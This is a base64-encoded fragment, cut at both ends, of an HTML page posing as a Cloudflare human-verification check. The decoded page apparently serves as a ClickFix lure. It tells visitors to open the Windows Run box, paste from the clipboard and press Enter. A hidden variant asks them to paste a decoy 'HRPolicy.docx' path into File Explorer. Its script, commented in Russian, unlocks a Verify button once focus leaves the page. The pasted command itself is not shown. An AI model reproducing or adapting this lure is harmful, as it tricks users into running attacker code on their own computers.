jYiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgIDwvc3ZnPiAgDQogICAgDQogICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBpZD0iY2hlY2tib3giIGNsYXNzPSJjaGVja2JveCBzdGVwMSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij48L2J1dHRvbj4NCg0KICAgICA8ZGl2IGNsYXNzPSJzcGlubmVyIHN0ZXAyIiBpZD0ic3Bpbm5lciIgc3R5bGU9InZpc2liaWxpdHk6IGhpZGRlbjsgZGlzcGxheTogbm9uZTsiPg0KICAgICAgPGRpdiBjbGFzcz0ibGRzLXJpbmciPg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICA8L2Rpdj4NCiAgICAgPC9kaXY+DQoNCiAgICAgPGRpdiBjbGFzcz0ic3RlcDMiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogICAgICA8c3ZnIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgdmlld0JveD0iMCAwIDUwIDUwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KICAgICAgIDxjaXJjbGUgY3g9IjI1IiBjeT0iMjUiIHI9IjIzIiBmaWxsPSIjMjhhNzQ1IiAvPg0KICAgICAgIDxwYXRoIGQ9Ik0xNSAyNSBMMjIgMzIgTDM1IDE4IiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgLz4NCiAgICAgIDwvc3ZnPg0KICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCg0KICAgIDxkaXYgY2xhc3M9InRldHR4Ij4NCiAgICAgPHAgY2xhc3M9InN0ZXAwIiBzdHlsZT0ibWFyZ2luOiAwICFpbXBvcnRhbnQ7ICI+VmVyaWZ5aW5nLi4uPC9wPg0KICAgICA8cCBjbGFzcz0ic3RlcDEiIHN0eWxlPSJtYXJnaW46IDAgIWltcG9ydGFudDsgZGlzcGxheTogbm9uZTsiPlZlcmlmeSB5b3UgYXJlIGh1bWFuPC9wPg0KICAgICA8cCBjbGFzcz0ic3RlcDIiIHN0eWxlPSJtYXJnaW46IDAgIWltcG9ydGFudDsgZGlzcGxheTogbm9uZTsiPlZlcmlmaWNhdGlvbiBTdGVwczwvcD4NCiAgICAgPHAgY2xhc3M9InN0ZXAzIiBzdHlsZT0ibWFyZ2luOiAwICFpbXBvcnRhbnQ7IGRpc3BsYXk6IG5vbmU7Ij5TdWNjZXNzZnVsbHkuPC9wPg0KICAgIDwvZGl2Pg0KDQogICAgPGRpdiBzdHlsZT0iZm9udC1zaXplOiA4cHg7IHRleHQtYWxpZ246IGNlbnRlcjsgbWFyZ2luLWxlZnQ6IGF1dG87Ij4NCiAgICAgPHN2ZyByb2xlPSJpbWciIGFyaWEtbGFiZWw9IkNsb3VkZmxhcmUiIGlkPSJsb2dvIiB2aWV3Qm94PSIwIDAgNzMgMjUiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTYxLjg4NDggMTUuNzg0MUw2Mi4wNjMyIDE1LjE1NzhDNjIuMjc1OCAxNC40MTI2IDYyLjE5NjcgMTMuNzIzOSA2MS44NDAxIDEzLjIxNzhDNjEuNTExOCAxMi43NTE3IDYwLjk2NDkgMTIuNDc3MyA2MC4zMDA3IDEyLjQ0NTNMNDcuNzIwMSAxMi4yODM2QzQ3LjY4MTEgMTIuMjgyOSA0Ny42NDI4IDEyLjI3MjggNDcuNjA4MyAxMi4yNTQyQzQ3LjU3MzggMTIuMjM1NiA0Ny41NDQyIDEyLjIwOSA0Ny41MjE3IDEyLjE3NjZDNDcuNDk5NiAxMi4xNDMxIDQ3LjQ4NTYgMTIuMTA0OSA0Ny40ODA3IDEyLjA2NDlDNDcuNDc1OCAxMi4wMjUgNDcuNDgwMSAxMS45ODQ0IDQ3LjQ5MzMgMTEuOTQ2NUM0Ny41MTQ5IDExLjg4MzkgNDcuNTU0MSAxMS44MjkxIDQ3LjYwNjEgMTEuNzg4OEM0Ny42NTggMTEuNzQ4NiA0Ny43MjA0IDExLjcyNDcgNDcuNzg1NiAxMS43Mkw2MC40ODI3IDExLjU1NjZDNjEuOTg4OSAxMS40ODY0IDYzLjYxOTYgMTAuMjQ2MiA2NC4xOTA1IDguNzMzNzJMNjQuOTE0NiA2LjgxMzYxQzY0Ljk0NDMgNi43MzI0MiA2NC45NTEgNi42NDQ0NCA2NC45MzQxIDYuNTU5NTdDNjQuMTEyIDIuODA2NTIgNjAuODExNSAwIDU2Ljg2NTIgMEM1My4yMjkzIDAgNTAuMTQyMSAyLjM4MTU4IDQ5LjAzNDcgNS42OTE4NkM0OC4yODY0IDUuMTIxODYgNDcuMzUzNSA0Ljg1OTgyIDQ2LjQyMjggNC45NTgyM0M0NC42Nzg1IDUuMTM0MDEgNDMuMjc2IDYuNTU5MjggNDMuMTAzNCA4LjMyOTc5QzQzLjA1OSA4Ljc3MTg5IDQzLjA5MTUgOS4yMTg0NSA0My4xOTkyIDkuNjQ5MThDNDAuMzQ5NyA5LjczMzQ3IDM4LjA2NDUgMTIuMTAyNyAzOC4wNjQ1IDE1LjAxNTFDMzguMDY0OSAxNS4yNzUxIDM4LjA4MzggMTUuNTM0NyAzOC4xMjEyIDE1Ljc5MTlDMzguMTI5NCAxNS44NTEzIDM4LjE1ODQgMTUuOTA1NyAzOC4yMDI5IDE1Ljk0NTJDMzguMjQ3NCAxNS45ODQ3IDM4LjMwNDQgMTYuMDA2NyAzOC4zNjM1IDE2LjAwNzFMNjEuNTg5NCAxNi4wMDk5QzYxLjU5MTYgMTYuMDEwMSA2MS41OTM4IDE2LjAxMDEgNjEuNTk2IDE2LjAwOTlDNjEuNjYxNiAxNi4wMDg4IDYxLjcyNTIgMTUuOTg2MiA2MS43NzcyIDE1Ljk0NTVDNjEuODI5MyAxNS45MDQ5IDYxLjg2NyAxNS44NDgzIDYxLjg4NDggMTUuNzg0MVoiIGZpbGw9IiNGNjgyMUYiPjwvcGF0aD48cGF0aCBkPSJNNjYuMDc1OCA2Ljk1Mjg1QzY1Ljk1OTIgNi45NTI4NSA2NS44NDMgNi45NTU4MiA2NS43Mjc0IDYuOTYxNzdDNjUuNzA4NyA2Ljk2MzEyIDY1LjY5MDQgNi45NjcxOSA2NS42NzI5IDYuOTczODVDNjUuNjQyNiA2Ljk4NDM3IDY1LjYxNTIgNy4wMDIxOSA2NS41OTMxIDcuMDI1NzlDNjUuNTcxMSA3LjA0OTM5IDY1LjU1NSA3LjA3ODA2IDY1LjU0NjIgNy4xMDkzNkw2NS4wNTE1IDguODQzMzNDNjQuODM4OSA5LjU4ODQ3IDY0LjkxOCAxMC4yNzY2IDY1LjI3NDkgMTAuNzgyN0M2NS42MDI5IDExLjI0OTQgNjYuMTQ5OCAxMS41MjMzIDY2LjgxNCAxMS41NTUyTDY5LjQ5NTkgMTEuNzE4NkM2OS41MzM2IDExLjcxOTkgNjkuNTcwNSAxMS43MyA2OS42MDM3IDExLjc0ODNDNjkuNjM2OSAxMS43NjY2IDY5LjY2NTQgMTEuNzkyNSA2OS42ODcgMTEuODIzOUM2OS43MDkyIDExLjg1NzYgNjkuNzIzNCAxMS44OTYgNjkuNzI4MyAxMS45MzYzQzY5LjczMzIgMTEuOTc2NSA2OS43Mjg4IDEyLjAxNzMgNjkuNzE1MyAxMi4wNTU1QzY5LjY5MzcgMTIuMTE4IDY5LjY1NDYgMTIuMTcyNyA2OS42MDI4IDEyLjIxMjlDNjkuNTUwOSAxMi4yNTMxIDY5LjQ4ODcgMTIuMjc3MSA2OS40MjM2IDEyLjI4MTlMNjYuNjM3MSAxMi40NDUzQzY1LjEyNDEgMTIuNTE2MSA2My40OTM3IDEzLjc1NTggNjIuOTIzMyAxNS4yNjgyTDYyLjcyMiAxNS44MDIyQzYyLjcxMzYgMTUuODI0NSA2Mi43MTA1IDE1Ljg0ODYgNjIuNzEzIDE1Ljg3MjRDNjIuNzE1NSAxNS44OTYxIDYyLjcyMzYgMTUuOTE4OSA2Mi43MzY1IDE1LjkzODlDNjIuNzQ5NSAxNS45NTg5IDYyLjc2NjkgMTUuOTc1NSA2Mi43ODc0IDE1Ljk4NzNDNjIuODA3OSAxNS45OTkxIDYyLjgzMDkgMTYuMDA1OCA2Mi44NTQ0IDE2LjAwNjhDNjIuODU2OSAxNi4wMDY4IDYyLjg1OTIgMTYuMDA2OCA2Mi44NjE4IDE2LjAwNjhINzIuNDUwMkM3Mi41MDYgMTYuMDA3MyA3Mi41NjA0IDE1Ljk4OTMgNzIuNjA1MSAxNS45NTU0QzcyLjY0OTggMTUuOTIxNiA3Mi42ODIzIDE1Ljg3MzkgNzIuNjk3NyAxNS44MTk1QzcyLjg2NzcgMTUuMjA0MyA3Mi45NTM1IDE0LjU2ODQgNzIuOTUyOSAxMy45Mjk2QzcyLjk1MTcgMTAuMDc2NyA2OS44NzMyIDYuOTUyODUgNjYuMDc1OCA2Ljk1Mjg1WiIgZmlsbD0iI0ZCQUQ0MSI+PC9wYXRoPjxwYXRoIGQ9Ik04LjExOTYzIDE4Ljg5MDRIOS43NTU0MVYyMy40MjU0SDEyLjYxMzlWMjQuODc5OEg4LjExOTYzVjE4Ljg5MDRaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PHBhdGggZD0iTTE0LjMwODEgMjEuOTAyM1YyMS44ODUzQzE0LjMwODEgMjAuMTY1NSAxNS42NzQgMTguNzcwNCAxNy40OTUyIDE4Ljc3MDRDMTkuMzE2NCAxOC43NzA0IDIwLjY2NTMgMjAuMTQ4MiAyMC42NjUzIDIxLjg2ODFWMjEuODg1M0MyMC42NjUzIDIzLjYwNTIgMTkuMjk5MSAyNC45OTk0IDE3LjQ3ODUgMjQuOTk5NEMxNS42NTc4IDI0Ljk5OTQgMTQuMzA4MSAyMy42MjIyIDE0LjMwODEgMjEuOTAyM1pNMTguOTk1OCAyMS45MDIzVjIxLjg4NTNDMTguOTk1OCAyMS4wMjIyIDE4LjM4MDYgMjAuMjY3OSAxNy40Nzg1IDIwLjI2NzlDMTYuNTg0NiAyMC4yNjc5IDE1Ljk4NTggMjEuMDAzOCAxNS45ODU4IDIxLjg2ODFWMjEuODg1M0MxNS45ODU4IDIyLjc0ODQgMTYuNjAxMyAyMy41MDI1IDE3LjQ5NTIgMjMuNTAyNUMxOC4zOTczIDIzLjUwMjUgMTguOTk1OCAyMi43NjY2IDE4Ljk5NTggMjEuOTAyM1oiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMjIuNjY3NCAyMi4yNTNWMTguODkwMUgyNC4zMjg0VjIyLjIxOTFDMjQuMzI4NCAyMy4wODIyIDI0Ljc1ODQgMjMuNDkzOSAyNS40MTU5IDIzLjQ5MzlDMjYuMDczMyAyMy40OTM5IDI2LjUwMzQgMjMuMTAwMyAyNi41MDM0IDIyLjI2MTdWMTguODkwMUgyOC4xNjQ3VjIyLjIwOTNDMjguMTY0NyAyNC4xNDMyIDI3LjA3NzIgMjQuOTg5OSAyNS4zOTkxIDI0Ljk4OTlDMjMuNzIxMSAyNC45ODk5IDIyLjY2NzQgMjQuMTI2OCAyMi42Njc0IDIyLjI1MjIiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMzAuNjY4IDE4Ljg5MDdIMzIuOTQ0NUMzNS4wNTI2IDE4Ljg5MDcgMzYuMjc1IDIwLjEyMjYgMzYuMjc1IDIxLjg1MDhWMjEuODY4NEMzNi4yNzUgMjMuNTk2MyAzNS4wMzU1IDI0Ljg4IDMyLjkxMSAyNC44OEgzMC42NjhWMTguODkwN1pNMzIuOTcgMjMuNDA3NkMzMy45NDgzIDIzLjQwNzYgMzQuNTk3IDIyLjg2MDkgMzQuNTk3IDIxLjg5MjhWMjEuODc1OUMzNC41OTcgMjAuOTE3OCAzMy45NDgzIDIwLjM2MTQgMzIuOTcgMjAuMzYxNEgzMi4zMDM4VjIzLjQwODJMMzIuOTcgMjMuNDA3NloiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNMzguNjUyNSAxOC44OTA0SDQzLjM3MzhWMjAuMzQ1M0g0MC4yODgzVjIxLjM2MzJINDMuMDc5VjIyLjc0MDdINDAuMjg4M1YyNC44Nzk4SDM4LjY1MjVWMTguODkwNFoiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNNDUuNjUgMTguODkwNEg0Ny4yODU4VjIzLjQyNTRINTAuMTQ0M1YyNC44Nzk4SDQ1LjY1VjE4Ljg5MDRaIiBjbGFzcz0ibG9nby10ZXh0Ij48L3BhdGg+PHBhdGggZD0iTTU0LjQxODcgMTguODQ3NUg1NS45OTQ5TDU4LjUwNzkgMjQuODc5N0g1Ni43NTQxTDU2LjMyMzggMjMuODEwMUg1NC4wNDdMNTMuNjI1NyAyNC44Nzk3SDUxLjkwNThMNTQuNDE4NyAxOC44NDc1Wk01NS44NTE4IDIyLjUxODNMNTUuMTk0MSAyMC44MTU0TDU0LjUyNzggMjIuNTE4M0g1NS44NTE4WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik02MC42MTQ5IDE4Ljg5MDFINjMuNDA1NkM2NC4zMDgzIDE4Ljg5MDEgNjQuOTMxNyAxOS4xMyA2NS4zMjggMTkuNTQwNkM2NS42NzQyIDE5Ljg4MyA2NS44NTExIDIwLjM0NjIgNjUuODUxMSAyMC45MzU3VjIwLjk1MjZDNjUuODUxMSAyMS44Njc4IDY1LjM2OTEgMjIuNDc1NCA2NC42MzY5IDIyLjc5MTlMNjYuMDQ1IDI0Ljg4SDY0LjE1NThMNjIuOTY3MSAyMy4wNjU4SDYyLjI1MDdWMjQuODhINjAuNjE0OVYxOC44OTAxWk02My4zMjk5IDIxLjc2NTRDNjMuODg2NCAyMS43NjU0IDY0LjIwNzEgMjEuNDkxNSA2NC4yMDcxIDIxLjA1NTFWMjEuMDM4MUM2NC4yMDcxIDIwLjU2NzQgNjMuODY5NyAyMC4zMjggNjMuMzIxMSAyMC4zMjhINjIuMjUwN1YyMS43NjY1TDYzLjMyOTkgMjEuNzY1NFoiIGNsYXNzPSJsb2dvLXRleHQiPjwvcGF0aD48cGF0aCBkPSJNNjguMjExMiAxOC44OTA0SDcyLjk1NzhWMjAuMzAyNEg2OS44MzAyVjIxLjIwOUg3Mi42NjMyVjIyLjUxODNINjkuODMwMlYyMy40NjgzSDczVjI0Ljg3OThINjguMjExMlYxOC44OTA0WiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjxwYXRoIGQ9Ik00LjUzODI0IDIyLjYwNDNDNC4zMDkxOCAyMy4xMyAzLjgyNzIzIDIzLjUwMjIgMy4xODY4MSAyMy41MDIyQzIuMjkyNjUgMjMuNTAyMiAxLjY3NzQ2IDIyLjc0OTMgMS42Nzc0NiAyMS44ODUxVjIxLjg2NzhDMS42Nzc0NiAyMS4wMDQ3IDIuMjc1OTMgMjAuMjY3NiAzLjE2OTggMjAuMjY3NkMzLjg0MzY3IDIwLjI2NzYgNC4zNTY4MSAyMC42ODgyIDQuNTczNCAyMS4yNjA1SDYuMjk3NjRDNi4wMjE1MSAxOS44MzQ5IDQuNzg3MTYgMTguNzcwNyAzLjE4NjgxIDE4Ljc3MDdDMS4zNjUzMyAxOC43NzA3IDAgMjAuMTY2NiAwIDIxLjg4NTFWMjEuOTAyMUMwIDIzLjYyMTkgMS4zNDg2IDI1IDMuMTY5OCAyNUM0LjcyNzYyIDI1IDUuOTQ1MjUgMjMuOTc2NCA2LjI2NjQ1IDIyLjYwNDZMNC41MzgyNCAyMi42MDQzWiIgY2xhc3M9ImxvZ28tdGV4dCI+PC9wYXRoPjwvc3ZnPg0KICAgICA8ZGl2Pg0KICAgICAgICA8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Ij5Qcml2YWN5PC9zcGFuPiDigKIgPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyI+VGVybXM8L3NwYW4+DQogICAgIDwvZGl2Pg0KICAgICANCiAgICA8L2Rpdj4NCiAgIDwvZGl2Pg0KDQogICA8ZGl2IGlkPSJ2ZXJpZnktd2luZG93IiBjbGFzcz0idmVyaWZ5LXdpbmRvdyIgc3R5bGU9ImJvcmRlci10b3A6IG5vbmU7IHBhZGRpbmctdG9wOiAwOyBtYXJnaW4tdG9wOiAwO21hcmdpbi1ib3R0b206MDsiPg0KICAgIDxkaXYgY2xhc3M9InZlcmlmeS1jb250YWluZXIiPg0KICAgICA8bWFpbiBjbGFzcz0idmVyaWZ5LW1haW4iIHN0eWxlPSJjb2xvcjogI2Q5ZDlkOTsiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJpbnN0cnVjdGlvbnMiPg0KICAgICAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6IDE4cHg7IG1hcmdpbi1ib3R0b206IDE1cHg7Ij4NCiAgICAgICAgICAgIFRvIHByb3ZlIHlvdSBhcmUgbm90IGEgcm9ib3QsIHBsZWFzZToNCiAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICA8b2w+DQogICAgICAgICAgPGxpPlByZXNzICZhbXA7IGhvbGQgdGhlIFdpbmRvd3MgS2V5IDxpIGNsYXNzPSJmYWIgZmEtd2luZG93cyI+PC9pPiArIDxiPlI8L2I+LjwvbGk+DQogICAgICAgICAgPGxpPldoZW4gdGhlIHdpbmRvdyBvcGVucywgcHJlc3MgPGI+Q3RybDwvYj4gKyA8Yj5WPC9iPi48L2xpPg0KICAgICAgICAgIDxsaT5QcmVzcyA8Yj5FbnRlcjwvYj4gdG8gY29tcGxldGUgdmVyaWZpY2F0aW9uLjwvbGk+DQoNCiAgICAgICAgICA8IS0tIDxsaT5QcmVzcyAgb24geW91ciBrZXlib2FyZCB0byBmaW5pc2guPC9saT4gLS0+DQogICAgICAgICAgPC9vbD4NCiAgICAgICAgICA8cCBzdHlsZT0icGFkZGluZy10b3A6IDEwcHg7Ij4NCiAgICAgICAgICA8IS0tIFlvdSB3aWxsIG9ic2VydmUgYW5kIGFncmVlOiAtLT4NCiAgICAgICAgICA8IS0tIDxiciAvPiAtLT4NCiAgICAgICAgICA8IS0tIDxjb2RlIHN0eWxlPSJiYWNrZ3JvdW5kOiBub25lOyBib3JkZXI6IDFweCBzb2xpZCAjNzk3OTc5OyB3aWR0aDogNDMycHg7Ij4g4pyFICJJIGFtIG5vdCBhIHJvYm90IC0gcmVDQVBUQ0hBIFZlcmlmaWNhdGlvbiBJRDogPHNwYW4gaWQ9InZlcmlmaWNhdGlvbi1pZCI+MTQ2ODIwPC9zcGFuPiIgPC9jb2RlPiAtLT4NCiAgICAgICAgICA8L3A+DQogICAgICAgICAgDQogICAgPC9kaXY+DQoNCiAgICAgPC9tYWluPg0KICAgIDwvZGl2Pg0KDQogICAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICA8b2w+DQogICAgICAgICAgPCEtLSAuLi4uLi4uPGxpIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAxMHB4OyI+DQogICAgICAgICAgICBDb3B5IHRoZSBmaWxlIHBhdGggYmVsb3cNCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvZGUtYmxvY2siIGlkPSJwYXRoIiBvbmNsaWNrPSJ0aGlzLmNsYXNzTGlzdC5hZGQoJ2NsaWNrZWQnKSI+DQogICAgICAgICAgICBDOlxpbnRlcm5hbC1zZWN1cmVcZmlsZWRyaXZlXEhSUG9saWN5LmRvY3gNCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgIDwvbGk+IDs7Ozs7OzstLT4NCiAgICAgICAgICA8bGkgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij5PcGVuIEZpbGUgRXhwbG9yZXIgYW5kIHNlbGVjdCB0aGUgYWRkcmVzcyBiYXIgKDxzdHJvbmc+Q1RSTCArIEw8L3N0cm9uZz4pPC9saT4NCiAgICAgICAgICA8bGkgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7Ij5QYXN0ZSB0aGUgcGF0aCAoPHN0cm9uZz5DVFJMICsgVjwvc3Ryb25nPikgYW5kIHByZXNzIDxzdHJvbmc+RW50ZXI8L3N0cm9uZz48L2xpPg0KICAgICAgICAgIDwvb2w+DQoNCiAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgaWQ9ImZpbGVJbnB1dCIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgICAgICAgICA8YnV0dG9uIGlkPSJmaWxlRXhwbG9yZXIiPk9wZW4gRmlsZSBFeHBsb3JlcjwvYnV0dG9uPg0KICAgICAgICA8L2Rpdj4NCg0KDQogICA8ZGl2IGNsYXNzPSJ2ZXJpZnktY29udGFpbmVyIHZlcmlmeS1mb290ZXIiIHN0eWxlPSJiYWNrZ3JvdW5kOiBub25lOyI+DQogICAgIDxkaXYgY2xhc3M9InZlcmlmeS1mb290ZXItbGVmdCIgc3R5bGU9IndpZHRoOiAyODZweDsgZmxvYXQ6IGxlZnQ7IHRleHQtYWxpZ246IGxlZnQ7IGZvbnQtc2l6ZTogMTVweDsiPg0KICAgICAgUGVyZm9ybSB0aGUgc3RlcHMgYWJvdmUgdG8gZmluaXNoIHZlcmlmaWNhdGlvbi4NCiAgICAgPC9kaXY+DQogICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idmVyaWZ5LXZlcmlmeS1idXR0b24gYmxvY2siIGlkPSJ2ZXJpZnktYnV0dG9uIiBzdHlsZT0iYmFja2dyb3VuZDogIzVlNWU1ZTsgcGFkZGluZzogOXB4IDM4cHg7IG9wYWNpdHk6IDAuNTsgY3Vyc29yOiBub3QtYWxsb3dlZDsiIGRpc2FibGVkPlZlcmlmeTwvYnV0dG9uPg0KICAgIDwvZGl2Pg0KICAgPC9kaXY+DQoNCiAgIDwhLS0gLS0+DQoNCiAgIDxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGRvbWFpbiA9IHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZTsNCiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIuZG9tYWluIikuZm9yRWFjaChlbCA9PiB7DQogICAgICAgIGlmIChlbCkgZWwudGV4dENvbnRlbnQgPSBkb21haW47DQogICAgfSk7DQp9KTsNCg0KLy8g0JDQutGC0LjQstCw0YbQuNGPINC60L3QvtC/0LrQuCDQv9GA0Lgg0L/QtdGA0LXQutC70Y7Rh9C10L3QuNC4INC90LAg0LTRgNGD0LPQvtC1INC+0LrQvdC+DQpsZXQgY2hlY2tJbnRlcnZhbDsNCg0KZnVuY3Rpb24gZW5hYmxlQnV0dG9uKCkgew0KICBjb25zdCB2ZXJpZnlCdXR0b24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndmVyaWZ5LWJ1dHRvbicpOw0KICBpZiAoIXZlcmlmeUJ1dHRvbikgcmV0dXJuOw0KDQogIGlmICh2ZXJpZnlCdXR0b24uZGlzYWJsZWQpIHsNCiAgICB2ZXJpZnlCdXR0b24uZGlzYWJsZWQgPSBmYWxzZTsNCiAgICB2ZXJpZnlCdXR0b24ucmVtb3ZlQXR0cmlidXRlKCdkaXNhYmxlZCcpOw0KICAgIHZlcmlmeUJ1dHRvbi5zdHlsZS5vcGFjaXR5ID0gJzEnOw0KICAgIHZlcmlmeUJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7DQogIH0NCg0KICBpZiAoY2hlY2tJbnRlcnZhbCkgew0KICAgIGNsZWFySW50ZXJ2YWwoY2hlY2tJbnRlcnZhbCk7DQogICAgY2hlY2tJbnRlcnZhbCA9IG51bGw7DQogIH0NCn0NCg0KLy8g0KHRgNCw0LHQsNGC0YvQstCw0LXRgiDQv9GA0Lgg0YPRhdC+0LTQtSDRhNC+0LrRg9GB0LAg0LjQtyDQstC60LvQsNC00LrQuC/QvtC60L3QsA0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2JsdXInLCBmdW5jdGlvbigpIHsNCiAgc2V0VGltZW91dChlbmFibGVCdXR0b24sIDUwKTsNCn0pOw0KDQovLyDQodGA0LDQsdCw0YLRi9Cy0LDQtdGCINC/0YDQuCDRgdC60YDRi9GC0LjQuC/Rg9GF0L7QtNC1INGB0L4g0YHRgtGA0LDQvdC40YbRiw0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ3BhZ2VoaWRlJywgZnVuY3Rpb24oKSB7DQogIHNldFRpbWVvdXQoZW5hYmxlQnV0dG9uLCA1MCk7DQp9KTsNCg0KLy8g0KHRgNCw0LHQsNGC0YvQstCw0LXRgiDQv9GA0Lgg0YHQutGA0YvRgtC40Lgg0LLQutC70LDQtNC60LggKNC/0LXRgNC10LrQu9GO0YfQtdC90LjQtSDQv9GA0LjQu9C+0LbQtdC90LjRjyDQuNC70Lgg0LLQutC70LDQtNC60LgpDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCd2aXNpYmlsaXR5Y2hhbmdlJywgZnVuY3Rpb24oKSB7DQogIGlmIChkb2N1bWVudC5oaWRkZW4pIHsNCiAgICBzZXRUaW1lb3V0KGVuYWJsZUJ1dHRvbiwgNTApOw0KICB9DQp9KTsNCg0KLy8g0JvQvtCy0LjQvCDQv9C+0YLQtdGA0Y4g0YTQvtC60YPRgdCwINCy0L3Rg9GC0YDQuCDQvtC60L3QsCAo0LIg0YIu0YcuINGB0LjRgdGC0LXQvNC90YvQtSDQtNC40LDQu9C+0LPQuCkg0YEgY2FwdHVyZQ0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2ZvY3Vzb3V0JywgZnVuY3Rpb24oKSB7DQogIHNldFRpbWVvdXQoZW5hYmxlQnV0dG9uLCA1MCk7DQp9LCB0cnVlKTsNCg0KLy8g0J3QsCDRgdC70YPRh9Cw0LksINC10YHQu9C4IGJsdXIvdmlzaWJpbGl0eWNoYW5nZSDQvdC1INGB0YDQsNCx0L7RgtCw0LvQuA0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KICBjaGVja0ludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7DQogICAgaWYgKCFkb2N1bWVudC5oYXNGb2N1cygpIHx8IGRvY3VtZW50LmhpZGRlbikgew0KICAgICAgZW5hYmxlQnV0dG9uKCk7DQogICAgfQ0KICB9LCAzMDApOw0KDQogIC8vINCi0LDQudC80LXRgDog0YfQtdGA0LXQtyAxMCDRgdC10LrRg9C90LQg0LrQvdC+0L/QutCwINGB0YLQsNC90LXRgiDQsNC60YLQuNCy0L3QvtC5INC00LDQttC1INCx0LXQtyDQv9C10YDQtdC60LvRjtGH0LXQvdC40Y8g0L7QutC90LANCiAgc2V0VGltZW91dChlbmFibGVCdXR0b24sIDEwMDAwKTsNCn0pOw0KDQovLyDQldGB0LvQuCDQutGD0YDRgdC+0YAg0YPRiNC10Lsg0LfQsCDQv9GA0LXQtNC10LvRiyDQvtC60L3QsCAo0YfQsNGB0YLRi9C5INGB0YbQtdC90LDRgNC40Lkg0L/RgNC4INGB0LzQtdC90LUg0L/RgNC40LvQvtC20LXQvdC40Y8pDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdtb3VzZWxlYXZlJywgZnVuY3Rpb24oKSB7DQogIHNldFRpbWVvdXQoZW5hYmxlQnV0dG9uLCA1MCk7DQp9KTsNCg0KLy8g0JDQutGC0LjQstC40YDRg9C10Lwg0LrQvdC+0L/QutGDINC/0YDQuCBDb21tYW5kK1IgKG1hYykg0LjQu9C4IEN0cmwrUiAod2luL2xpbnV4KSDigJQg0L/RgNC10LTQvtGC0LLRgNCw0YnQsNC10Lwg0L/QtdGA0LXQt9Cw0LPRgNGD0LfQutGDDQp3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsIGZ1bmN0aW9uKGUpIHsNCiAgY29uc3QgaXNSID0gZS5rZXkgJiYgZS5rZXkudG9Mb3dlckNhc2UoKSA9PT0gJ3InOw0KICBpZiAoIWlzUikgcmV0dXJuOw0KDQogIC8vIENvbW1hbmQrUg0KICBpZiAoZS5tZXRhS2V5KSB7DQogICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIGVuYWJsZUJ1dHRvbigpOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIC8vIEN0cmwrUg0KICBpZiAoZS5jdHJsS2V5KSB7DQogICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgIGVuYWJsZUJ1dHRvbigpOw0KICB9DQp9KTsNCjwvc2NyaXB0Pg0KDQogIDwvZGl2Pg0KICAgIDxwIHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsNCiAgICBsaW5lLWhlaWdodDogMi4yNXJlbTsgcGFkZGluZy10b3A6IDIwcHg7Ij48c3BhbiBj